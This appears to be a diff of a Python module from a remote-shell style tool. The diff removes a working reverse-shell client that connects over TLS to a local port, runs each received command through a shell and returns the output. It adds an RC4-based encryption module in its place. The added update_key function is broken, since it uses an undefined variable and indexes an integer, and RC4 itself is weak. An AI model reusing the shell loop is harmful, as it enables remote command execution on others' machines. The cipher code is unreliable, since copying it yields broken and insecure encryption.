@@ -45,38 +45,58 @@ under certain conditions.
 __license__ = license
 __copyright__ = copyright
 
-__all__ = []
+__all__ = ["encrypt", "decrypt", "initialization", "update_key"]
 
-print(copyright)
+from functools import partial
+from os import urandom
 
-from os.path import join
-from socket import socket
-from contextlib import suppress
-from subprocess import run, PIPE
-from ssl import SSLContext, PROTOCOL_TLS_CLIENT
+def update_key(key_base: bytes, key: bytes) -> bytes:
+    """
+    This method updates encryption key.
+    """
 
-context = SSLContext(PROTOCOL_TLS_CLIENT)
-context.load_verify_locations(join("..", "server.crt"))
+    key_base = len(key_length)
+    return bytes(
+        [key_base[i % key_length] ^ char for i, char in enumerate(key)]
+    )
 
+def initialization(key_text: bytes) -> bytes:
+    """
+    This method initializes RC4 key.
+    """
 
-def sendall(data):
-    chunk = data[:30000]
-    data = data[30000:]
-    while chunk:
-        ss.sendall(chunk)
-        chunk = data[:30000]
-        data = data[30000:]
+    key = bytearray(range(256))
+    j = 0
 
+    for i in range(256):
+        j = (j + key[i] + key_text[i % len(key_text)]) % 256
+        key[i], key[j] = key[j], key[i]
 
-data = b" "
-while True:
-    with suppress(Exception):
-        s = socket()
-        ss = context.wrap_socket(s, server_hostname="localhost")
-        ss.connect(("127.0.0.1", 1337))
-        sendall(data)
-        command = ss.recv(65535).decode()
-        p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
-        data = p.stdout or p.stderr or b" "
-        ss.close()
-        s.close()
+    return key
+
+def encrypt(key: bytes, data: bytes, decrypt: bool = False) -> bytes:
+    """
+    This method encrypts/decrypts data with RC4.
+    """
+
+    if decrypt:
+        iv = data[:256]
+        data = data[256:]
+    else:
+        iv = urandom(256)
+
+    i = j = 0
+    encrypted = bytearray()
+    key = [iv[i] ^ char for i, char in enumerate(key)]
+
+    for char in data:
+        i = (i + 1) % 256
+        j = (j + key[i]) % 256
+        key[i], key[j] = key[j], key[i]
+        encrypted.append(char ^ key[(key[i] + key[j]) % 256])
+
+    if decrypt:
+        return bytes(encrypted)
+    return iv + bytes(encrypted)
+
+decrypt = partial(encrypt, decrypt=True)
